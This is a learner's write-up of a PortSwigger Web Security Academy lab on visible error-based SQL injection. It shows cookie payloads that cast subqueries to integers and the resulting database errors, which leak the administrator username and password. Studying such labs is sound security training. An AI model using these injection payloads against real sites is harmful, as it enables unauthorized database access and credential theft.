# Visible error-based SQL injection


### Here I'm cast typing the SELECT query as int , to get the error .
**Request**
```http
GET / HTTP/2
Host: 0a06003f03810414846e468d00f90007.web-security-academy.net
Cookie: TrackingId=z4227ldppDOBR5Rd'AND CAST((SELECT 1) AS int)--;session=[REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

### In response we can see its telling error to do as boolean type .
**Response**
```html
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2435

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Visible error-based SQL injection</title>
    </head>
  [...middle remain omitted...]
          <h4>ERROR: argument of AND must be type boolean, not type integer
          Position: 62</h4>
          <p class=is-warning>ERROR: argument of AND must be type boolean, not type integer
          Position: 62</p>
        </div>
    </section>
</div>
</body>
</html>
```

---

### Now to show it with boolean value , did `TRUE=CAST((SELECT 1)`  
```http
Cookie: TrackingId=z4227ldppDOBR5Rd'AND TRUE=CAST((SELECT 1) AS int)--;
```
Got this error , this means i need to give a value like 1 or 0 which means True and False respectively .
```
ERROR: operator does not exist: boolean = integer
Hint: No operator matches the given name and argument types. You might need to add explicit type casts.
Position: 61
```

### And got 200 status code , this means this query is true , so afterwards we'll be implementing every injection with this .
```http
Cookie: TrackingId=z4227ldppDOBR5Rd'AND 1=CAST((SELECT 1) AS int)--;
```
---
### Now the lab told there is a table named users and column names username 
```http
Cookie: TrackingId=z4227ldppDOBR5Rd'AND 1=CAST((SELECT username FROM users) AS int)--;
```
### Got this error , tried to solve it by my own but getting different errors so saw the solution and we need to just remove the id .
```
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE
id = 'z4227ldppDOBR5Rd'AND 1=CAST((SELECT username FROM users'. Expected  char
```
---
```http
Cookie: TrackingId='AND 1=CAST((SELECT username FROM users) AS int)--;
```

### Got this error this means we need to limit it to give one row .
```
ERROR: more than one row returned by a subquery used as an expression
```
---
### Provided the limit and got a error which is helpful .
```http
Cookie: TrackingId='AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--;
```
### It just gave the first username which we were told to find .
```
ERROR: invalid input syntax for type integer: "administrator"
```
---
### So to get the password used but but got Unterminated identifier error , but I found another way .
```http
Cookie: TrackingId='AND 1=CAST((SELECT password FROM users WHERE username="administrator") AS int)--;
```
### We can also get the password with limit and we actually got it in form of a error.
```http
Cookie: TrackingId='AND 1=CAST((SELECT password FROM users LIMIt 1) AS int)--;
```

```
ERROR: invalid input syntax for type integer: "7fivrb3bqf33257ya2n4"
```

